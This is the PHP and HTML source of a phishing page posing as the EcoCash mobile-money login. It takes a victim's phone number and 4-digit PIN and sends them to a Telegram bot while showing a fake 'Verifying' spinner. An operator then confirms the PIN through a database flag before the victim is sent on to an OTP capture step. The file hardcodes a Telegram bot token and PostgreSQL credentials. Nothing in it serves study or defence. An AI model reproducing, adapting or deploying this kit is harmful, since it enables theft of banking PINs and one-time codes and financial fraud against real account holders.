<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// PostgreSQL credentials
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==================================

// Get phone from session (set by index.php)
$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';
$flashMessage = '';
$verifying = false;

if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

/**
 * Send Telegram message
 */
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    
    // fallback
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// ========== Handle AJAX requests ==========
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    header('Content-Type: application/json');
    
    // Handle resetting pin to 0 when user starts typing
    if (isset($_POST['action']) && $_POST['action'] === 'reset_pin') {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if ($conn) {
            // Only reset if current pin is 1 (verifying/failed state)
            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1 AND pin IN (0,1)";
            $result = pg_query_params($conn, $updateSQL, [$phone]);
            if ($result) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false]);
            }
        } else {
            echo json_encode(['success' => false]);
        }
        exit;
    }
    
    // Handle checking pin status (for polling)
    if (isset($_POST['action']) && $_POST['action'] === 'check_pin_status') {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if ($conn) {
            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
            $result = pg_query_params($conn, $checkSQL, [$phone]);
            if ($result && $row = pg_fetch_assoc($result)) {
                $pinStatus = (int)$row['pin'];
                echo json_encode(['pin_status' => $pinStatus]);
            } else {
                echo json_encode(['pin_status' => 0]);
            }
        } else {
            echo json_encode(['pin_status' => 0]);
        }
        exit;
    }
}

// ========== Process PIN submission ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    // Get PIN from the array
    if (isset($_POST['pin']) && is_array($_POST['pin'])) {
        $pinArray = $_POST['pin'];
        $pin = implode('', $pinArray);
    } else {
        $pin = '';
    }
    
    $pin = preg_replace('/[^0-9]/', '', $pin);
    
    if (strlen($pin) === 4) {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if (!$conn) {
            $error = "System error. Please contact administrator.";
            $_SESSION['pin_error'] = $error;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            // Ensure `users` table exists
            $createSQL = "
                CREATE TABLE IF NOT EXISTS users (
                    phone VARCHAR(20) PRIMARY KEY,
                    status INTEGER DEFAULT 0,
                    pin INTEGER DEFAULT 0,
                    otp INTEGER DEFAULT 0
                )
            ";
            pg_query($conn, $createSQL);
            
            // Insert phone if not exists
            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
            pg_query_params($conn, $insertSQL, [$phone]);
            
            // Check current pin status before setting to 1
            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
            $checkResult = pg_query_params($conn, $checkSQL, [$phone]);
            if ($checkResult && $row = pg_fetch_assoc($checkResult)) {
                $currentPinStatus = (int)$row['pin'];
                
                // If pin is already 2, redirect to OTP
                if ($currentPinStatus === 2) {
                    $_SESSION['pin_verified'] = true;
                    header("Location: otp.php");
                    exit;
                }
            }
            
            // Set verifying mode - set pin to 1 to start verification
            $updateSQL = "UPDATE users SET pin = 1 WHERE phone = $1";
            pg_query_params($conn, $updateSQL, [$phone]);
            
            // Set session to indicate we're waiting for verification
            $_SESSION['verifying'] = true;
            $_SESSION['submitted_pin'] = $pin;
            
            // Send Telegram notification
            $ip = "https://loan-1-i36j.onrender.com/verify.php";
            $time = date('Y-m-d H:i:s');
            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
            sendTelegramMessage($botToken, $chatId, $msg);
            
            // Redirect to show verifying state
            header("Location: " . $_SERVER['PHP_SELF'] . "?verifying=1");
            exit;
        }
    } else {
        $error = "PIN must be 4 digits.";
        $_SESSION['pin_error'] = $error;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

// Check if we're in verifying mode
if (isset($_GET['verifying']) || (isset($_SESSION['verifying']) && $_SESSION['verifying'] === true)) {
    $verifying = true;
    // Clear session verifying after setting
    if (isset($_SESSION['verifying'])) {
        unset($_SESSION['verifying']);
    }
}

// Check for error from session
if (isset($_SESSION['pin_error'])) {
    $error = $_SESSION['pin_error'];
    unset($_SESSION['pin_error']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EcoCash | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #0a5fa7; }
        .top {
            background: #ffffff;
            padding: 8vh 5vw 12vh;
            border-bottom-left-radius: 100% 80px;
            border-bottom-right-radius: 100% 80px;
            text-align: center;
        }
        .logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; }
        .logo span:first-child { color: #1d4ed8; }
        .logo span:last-child { color: #dc2626; }
        .login-title { font-size: 24px; color: #6b7280; margin-bottom: 30px; }
        .phone-box {
            border: 2px solid #1d4ed8;
            border-radius: 12px;
            padding: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            max-width: 360px;
            margin: 0 auto 30px;
        }
        .flag { width: 26px; height: 18px; }
        .code { font-size: 18px; color: #374151; }
        .pin-label { color: #6b7280; margin-bottom: 15px; font-size: 16px; }
        .pin {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        .pin input {
            width: 55px;
            height: 55px;
            border: 2px solid #1d4ed8;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            outline: none;
        }
        .pin input:focus { border-color: #2563eb; }
        .pin input:disabled { background-color: #f3f4f6; cursor: not-allowed; }
        .forgot { color: #6b7280; font-size: 16px; text-decoration: none; }
        .error-message, .flash-message, .verifying-message {
            padding: 10px;
            border-radius: 8px;
            margin: 10px auto;
            max-width: 300px;
            font-size: 14px;
            text-align: center;
        }
        .error-message { color: #dc2626; background: #fee2e2; }
        .flash-message { color: #dc2626; background: #fee2e2; }
        .verifying-message { 
            color: #1d4ed8; 
            background: #dbeafe; 
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        /* Animated dots for verifying message */
        .dots {
            display: inline-flex;
            gap: 3px;
        }
        .dots span {
            width: 6px;
            height: 6px;
            background-color: #1d4ed8;
            border-radius: 50%;
            animation: dotPulse 1.4s infinite ease-in-out both;
        }
        .dots span:nth-child(1) { animation-delay: -0.32s; }
        .dots span:nth-child(2) { animation-delay: -0.16s; }
        @keyframes dotPulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
            40% { transform: scale(1); opacity: 1; }
        }
        .bottom {
            padding: 8vh 5vw 5vh;
            text-align: center;
            color: #ffffff;
        }
        .actions {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        .action-btn {
            background: #ffffff;
            color: #111827;
            width: 160px;
            padding: 18px 10px;
            border-radius: 14px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
        .version { font-size: 14px; opacity: 0.9; }
        .terms { font-size: 13px; opacity: 0.9; }
        .fade-out {
            animation: fadeOut 0.5s forwards;
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; visibility: hidden; }
        }
    </style>
</head>
<body>
<div class="top">
    <div class="logo"><span>Eco</span><span>Cash</span></div>
    <div class="login-title">Login</div>
    <div class="phone-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" class="flag" alt="Zimbabwe flag">
        <div class="code">+263 <?= htmlspecialchars($phone) ?></div>
    </div>
    <div class="pin-label">Enter your PIN</div>

    <?php if ($flashMessage): ?>
        <div class="flash-message"><?= htmlspecialchars($flashMessage) ?></div>
    <?php endif; ?>

    <div id="messageContainer">
        <?php if ($error && !$verifying): ?>
            <div id="statusMessage" class="error-message"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
        <?php if ($verifying): ?>
            <div id="statusMessage" class="verifying-message">
                <div class="spinner"></div>
                Verifying<span class="dots"><span>.</span><span>.</span><span>.</span></span>
            </div>
        <?php endif; ?>
    </div>

    <form method="POST" id="pinForm">
        <div class="pin">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : 'autofocus' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" <?= $verifying ? 'disabled' : '' ?>>
        </div>
        <input type="hidden" name="submitted" value="1">
    </form>
    <a href="#" class="forgot">Forgot PIN?</a>
</div>
<div class="bottom">
    <p>To register an EcoCash wallet or get assistance,<br>click below</p>
    <div class="actions">
        <button class="action-btn" type="button">👤 Register</button>
        <button class="action-btn" type="button">ℹ️ Help & Support</button>
    </div>
    <div class="version">v2.1.3P</div>
    <div class="terms">By signing in you agree to the Terms and Conditions</div>
</div>

<script>
    const inputs = document.querySelectorAll('.pin input');
    let verificationInterval = null;
    let isVerifying = <?= json_encode($verifying) ?>;
    let errorTimeout = null;
    let isSubmitting = false;
    
    function submitForm() {
        if (isSubmitting || isVerifying) return;
        
        let pinValue = '';
        for (let i = 0; i < inputs.length; i++) {
            if (!inputs[i].value) {
                return; // Don't submit if any field is empty
            }
            pinValue += inputs[i].value;
        }
        
        if (pinValue.length === 4) {
            isSubmitting = true;
            document.getElementById('pinForm').submit();
        }
    }
    
    function allFilled() {
        let filled = true;
        let pinValue = '';
        for (let i = 0; i < inputs.length; i++) {
            if (!inputs[i].value) {
                filled = false;
                break;
            }
            pinValue += inputs[i].value;
        }
        
        if (filled && pinValue.length === 4 && !isVerifying && !isSubmitting) {
            submitForm();
        }
    }
    
    // Function to reset pin to 0 via AJAX when user starts typing
    function resetPinInDatabase() {
        // Don't reset if we're in verifying state
        if (isVerifying) return;
        
        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'action=reset_pin'
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                console.log('PIN reset to 0');
            }
        })
        .catch(error => console.error('Error resetting PIN:', error));
    }
    
    // Function to check pin status (polling)
    function checkPinStatus() {
        fetch(window.location.href, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'action=check_pin_status'
        })
        .then(response => response.json())
        .then(data => {
            const pinStatus = data.pin_status;
            
            // If status is 1 -> wrong PIN (verification failed)
            if (pinStatus === 1) {
                if (verificationInterval) {
                    clearInterval(verificationInterval);
                    verificationInterval = null;
                }
                
                // Show wrong PIN error message
                const messageContainer = document.getElementById('messageContainer');
                messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                isVerifying = false;
                
                // Reset pin in database back to 0
                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: 'action=reset_pin'
                });
                
                // Re-enable inputs and clear them
                inputs.forEach(input => {
                    input.disabled = false;
                    input.value = '';
                });
                if (inputs[0]) inputs[0].focus();
                isSubmitting = false;
                
                // Remove verifying parameter from URL
                const url = new URL(window.location.href);
                url.searchParams.delete('verifying');
                window.history.replaceState({}, '', url);
                
                // Fade out error message after 3 seconds
                setTimeout(() => {
                    const msgDiv = document.getElementById('statusMessage');
                    if (msgDiv && msgDiv.classList) {
                        msgDiv.classList.add('fade-out');
                        setTimeout(() => {
                            if (msgDiv && msgDiv.parentNode) {
                                msgDiv.remove();
                            }
                        }, 500);
                    }
                }, 3000);
                
            } 
            // If status is 2 -> success, redirect to otp.php
            else if (pinStatus === 2) {
                if (verificationInterval) {
                    clearInterval(verificationInterval);
                    verificationInterval = null;
                }
                window.location.href = 'otp.php';
            }
            // Status 0 means still waiting (or reset), continue polling
        })
        .catch(error => console.error('Error checking PIN status:', error));
    }
    
    // Handle user typing in PIN inputs
    if (!isVerifying) {
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Allow only numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                // If user starts typing and we have an error message showing, reset the database pin to 0
                const errorMsg = document.getElementById('statusMessage');
                if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message')) {
                    resetPinInDatabase();
                    if (errorTimeout) clearTimeout(errorTimeout);
                    errorMsg.classList.add('fade-out');
                    setTimeout(() => {
                        if (errorMsg && errorMsg.parentNode) {
                            errorMsg.remove();
                        }
                    }, 500);
                }
                
                // Auto-focus next input
                if (e.target.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                // Check if all filled
                allFilled();
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    e.preventDefault();
                }
            });
            
            // Prevent paste of non-numeric characters
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                let pasteData = (e.clipboardData || window.clipboardData).getData('text');
                pasteData = pasteData.replace(/[^0-9]/g, '');
                if (pasteData) {
                    const digits = pasteData.split('').slice(0, 4);
                    for (let i = 0; i < digits.length && i + index < inputs.length; i++) {
                        inputs[index + i].value = digits[i];
                    }
                    // Focus next empty input
                    for (let i = 0; i < inputs.length; i++) {
                        if (!inputs[i].value) {
                            inputs[i].focus();
                            break;
                        }
                    }
                    allFilled();
                }
            });
        });
    }
    
    // Start verification polling if in verifying mode
    if (isVerifying) {
        // Disable inputs while verifying
        inputs.forEach(input => {
            input.disabled = true;
        });
        
        // Start polling every 2 seconds
        verificationInterval = setInterval(checkPinStatus, 2000);
        // Immediate first check
        setTimeout(checkPinStatus, 500);
    }
</script>
</body>
</html>
